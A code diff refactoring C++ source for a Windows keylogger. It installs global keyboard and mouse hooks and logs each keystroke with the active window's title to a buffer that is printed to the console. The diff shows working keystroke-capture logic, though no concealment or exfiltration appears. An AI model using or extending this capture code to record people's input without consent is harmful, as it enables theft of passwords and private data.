@@ -66,7 +66,7 @@ void KeyLogger::run() {
     m_running = true;
     s_programRunning = true;
 
-    s_messageThreadId = GetCurrentThreadId(); // ← ВАЖНО
+    s_messageThreadId = GetCurrentThreadId();
 
     processMessageLoop();
 }
@@ -120,14 +120,16 @@ void KeyLogger::uninstallHooks() {
 }
 
 LRESULT CALLBACK KeyLogger::keyboardHookProc(
-    int nCode, WPARAM wParam, LPARAM lParam)
+    const int nCode,
+    const WPARAM wParam,
+    const LPARAM lParam
+    )
 {
     if (nCode == HC_ACTION && s_captureEnabled) {
         auto* p = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
 
         if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
 
-            // Ctrl R -> выход
             if (p->vkCode == VK_RETURN) {
                 g_requestOutput.store(true, std::memory_order_relaxed);
                 PostThreadMessage(s_messageThreadId, WM_APP + 1, 0, 0);
@@ -139,7 +141,6 @@ LRESULT CALLBACK KeyLogger::keyboardHookProc(
             }
 
 
-            // лог
             EnterCriticalSection(&s_criticalSection);
             s_keyLogBuffer.emplace_back(
                 getActiveWindowTitle() + " | " +
@@ -153,7 +154,10 @@ LRESULT CALLBACK KeyLogger::keyboardHookProc(
 
 
 LRESULT CALLBACK KeyLogger::mouseHookProc(
-    int nCode, WPARAM wParam, LPARAM lParam)
+    const int nCode,
+    const WPARAM wParam,
+    const LPARAM lParam
+    )
 {
     if (nCode == HC_ACTION && s_captureEnabled) {
         if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN) {
@@ -207,23 +211,22 @@ void KeyLogger::triggerOutput()
     std::cout << "\nОжидание следующего триггера...\n> ";
 }
 
-std::string KeyLogger::virtualKeyToString(DWORD vkCode)
+std::string KeyLogger::virtualKeyToString(const DWORD vkCode)
 {
     BYTE keyboardState[256];
     if (!GetKeyboardState(keyboardState)) {
         return "";
     }
 
-    // Получаем раскладку активного окна
     HWND hwnd = GetForegroundWindow();
-    DWORD threadId = GetWindowThreadProcessId(hwnd, nullptr);
+    const DWORD threadId = GetWindowThreadProcessId(hwnd, nullptr);
     HKL layout = GetKeyboardLayout(threadId);
 
     wchar_t buffer[5] = {0};
 
-    UINT scanCode = MapVirtualKeyEx(vkCode, MAPVK_VK_TO_VSC, layout);
+    const UINT scanCode = MapVirtualKeyEx(vkCode, MAPVK_VK_TO_VSC, layout);
 
-    int result = ToUnicodeEx(
+    const int result = ToUnicodeEx(
         vkCode,
         scanCode,
         keyboardState,
@@ -233,13 +236,9 @@ std::string KeyLogger::virtualKeyToString(DWORD vkCode)
         layout
     );
 
-    if (result > 0) {
-        return StringUtils::utf16_to_utf8(std::wstring(buffer, result));
-    }
-
     switch (vkCode) {
-        case VK_LBUTTON: return "[ЛКМ]";
-        case VK_RBUTTON: return "[ПКМ]";
+        case VK_LBUTTON: return "[LMB]";
+        case VK_RBUTTON: return "[RMB]";
         case VK_BACK: return "[Backspace]";
         case VK_TAB: return "[Tab]";
         case VK_RETURN: return "[Enter]";
@@ -261,6 +260,11 @@ std::string KeyLogger::virtualKeyToString(DWORD vkCode)
         case VK_LWIN:  return "[lWin]";
         case VK_RWIN:  return "[rWin]";
         default:
+
+            if (result > 0) {
+                return StringUtils::utf16_to_utf8(std::wstring(buffer, result));
+            }
+
             return "[Key:" + std::to_string(vkCode) + "]";
     }
 
